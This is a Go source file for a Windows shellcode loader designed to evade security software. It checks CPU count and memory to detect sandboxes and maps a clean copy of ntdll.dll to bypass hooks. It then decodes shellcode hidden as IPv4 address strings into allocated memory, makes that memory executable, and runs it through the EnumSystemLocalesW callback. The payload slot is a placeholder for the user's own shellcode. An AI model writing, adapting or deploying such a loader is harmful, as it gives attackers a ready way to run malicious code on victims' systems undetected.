/*
   Author: Crispr
*/
package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"github.com/Binject/universal"
	"golang.org/x/sys/windows"
)

var (
	kernel32           = windows.NewLazySystemDLL("kernel32")
	Activeds           = windows.NewLazySystemDLL("Activeds.dll")
	HeapCreate         = kernel32.NewProc("HeapCreate")
	HeapAlloc          = kernel32.NewProc("HeapAlloc")
	AllocADsMem        = Activeds.NewProc("AllocADsMem")
	VirtualProtectEx   = kernel32.NewProc("VirtualProtectEx")
	EnumSystemLocalesW = kernel32.NewProc("EnumSystemLocalesW")
)

const (
	//配置堆属性
	MEM_COMMIT                 = 0x1000
	MEM_RESERVE                = 0x2000
	PAGE_EXECUTE_READWRITE     = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
	HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
)

//此处放转换后的shellcode 例如 252.72.131.228\x00", "240.232.200.0\x00\x00"
var shell_ipv4 []string = []string{"Your shellcode"}

func timeSleep() (int, error) {
	startTime := time.Now()
	time.Sleep(10 * time.Second)
	endTime := time.Now()
	sleepTime := endTime.Sub(startTime)
	if sleepTime >= time.Duration(10*time.Second) {
		return 1, nil
	} else {
		return 0, nil
	}
}

func numverofCPU() (int, error) {
	num_of_cpu := runtime.NumCPU()
	if num_of_cpu < 4 {
		return 0, nil
	} else {
		return 1, nil
	}
}

func physicalMemory() (int, error) {
	var mod = syscall.NewLazyDLL("kernel32.dll")
	var proc = mod.NewProc("GetPhysicallyInstalledSystemMemory")
	var mem uint64
	proc.Call(uintptr(unsafe.Pointer(&mem)))
	mem = mem / 1048576
	if mem < 4 {
		return 0, nil
	}
	return 1, nil
}

func main() {
	//自定义睡眠时间
	//timeSleep()
	var ntdll_image []byte
	var err error
	num, _ := numverofCPU()
	mem, _ := physicalMemory()
	if num == 0 || mem == 0 {
		fmt.Printf("Hello Crispr")
		os.Exit(1)
	}
	ntdll_image, err = ioutil.ReadFile("C:\\Windows\\System32\\ntdll.dll")
	/*
		heapAddr, _, err := HeapCreate.Call(uintptr(HEAP_CREATE_ENABLE_EXECUTE), 0, 0)
		if heapAddr == 0 {
			log.Fatal(fmt.Sprintf("there was an error calling the HeapCreate function:\r\n%s", err))
		}
	*/
	ntdll_loader, err := universal.NewLoader()

	if err != nil {
		log.Fatal(err)
	}
	ntdll_library, err := ntdll_loader.LoadLibrary("main", &ntdll_image)

	if err != nil {
		log.Fatal(fmt.Sprintf("there was an error calling the LoadLibrary function:\r\n%s", err))
	}
	/*
		addr, _, err := HeapAlloc.Call(heapAddr, 0, uintptr(len(shell_mac)*6))
	*/
	addr, _, err := AllocADsMem.Call(uintptr(len(shell_ipv4) * 4))
	if addr == 0 || err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapAlloc function:\r\n%s", err))
	}
	addrptr := addr
	for _, ipv4 := range shell_ipv4 {
		u := append([]byte(ipv4), 0)
		_, err = ntdll_library.Call("RtlIpv4StringToAddressA", uintptr(unsafe.Pointer(&u[0])), uintptr(0), uintptr(unsafe.Pointer(&u[0])), addrptr)
		if err != nil && err.Error() != "The operation completed successfully." {
			log.Fatal(fmt.Sprintf("there was an error calling the HeapAlloc function:\r\n%s", err))
		}
		addrptr += 4
	}
	oldProtect := windows.PAGE_READWRITE
	VirtualProtectEx.Call(uintptr(windows.CurrentProcess()), addr, uintptr(len(shell_ipv4)*4), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	EnumSystemLocalesW.Call(addr, 0)
}
